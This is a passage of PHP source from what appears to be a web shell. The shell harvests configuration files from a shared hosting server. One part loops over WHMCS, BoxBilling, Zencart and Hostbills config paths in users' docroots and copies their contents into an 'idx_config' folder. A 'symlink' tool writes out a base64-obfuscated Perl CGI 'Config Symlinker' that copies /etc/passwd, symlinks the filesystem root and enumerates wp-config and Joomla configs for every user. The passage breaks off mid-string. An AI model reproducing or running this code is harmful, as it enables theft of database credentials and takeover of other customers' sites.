                        "$user_docroot/support/order/submitticket.php" => "WHMCS",
                        "$user_docroot/bb-config.php" => "BoxBilling",
                        "$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
                        "$user_docroot/box/bb-config.php" => "BoxBilling",
                        "$user_docroot/host/bb-config.php" => "BoxBilling",
                        "$user_docroot/Host/bb-config.php" => "BoxBilling",
                        "$user_docroot/supportes/bb-config.php" => "BoxBilling",
                        "$user_docroot/support/bb-config.php" => "BoxBilling",
                        "$user_docroot/hosting/bb-config.php" => "BoxBilling",
                        "$user_docroot/cart/bb-config.php" => "BoxBilling",
                        "$user_docroot/order/bb-config.php" => "BoxBilling",
                        "$user_docroot/client/bb-config.php" => "BoxBilling",
                        "$user_docroot/clients/bb-config.php" => "BoxBilling",
                        "$user_docroot/cliente/bb-config.php" => "BoxBilling",
                        "$user_docroot/clientes/bb-config.php" => "BoxBilling",
                        "$user_docroot/billing/bb-config.php" => "BoxBilling",
                        "$user_docroot/billings/bb-config.php" => "BoxBilling",
                        "$user_docroot/my/bb-config.php" => "BoxBilling",
                        "$user_docroot/secure/bb-config.php" => "BoxBilling",
                        "$user_docroot/support/order/bb-config.php" => "BoxBilling",
                        "$user_docroot/includes/dist-configure.php" => "Zencart",
                        "$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
                        "$user_docroot/products/includes/dist-configure.php" => "Zencart",
                        "$user_docroot/cart/includes/dist-configure.php" => "Zencart",
                        "$user_docroot/shop/includes/dist-configure.php" => "Zencart",
                        "$user_docroot/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/host/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/Host/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/support/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/cart/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/order/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/client/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/clients/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/billing/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/billings/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/my/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/secure/includes/iso4217.php" => "Hostbills",
                        "$user_docroot/support/order/includes/iso4217.php" => "Hostbills"
                    );
                    foreach($getconfig as $config => $userconfig) {
                        $get = file_get_contents($config);
                        if($get == '') {
                        }
                        else {
                            $fopen = fopen("idx_config/$user-$userconfig.txt", "w");
                            fputs($fopen, $get);
                        }
                    }
                }
            }
        }
        print "<div style='background: #ffffff; width: 100%; height: 100%'>";
        print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'><iframe>";
        print "</div>";
    }
    elseif($toolsname === "symlink") {
        if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
        if(!is_dir(path()."/idx_sym/")) {
            $sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltIjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdpZHhfc3ltL25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy8uYWNjZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+IC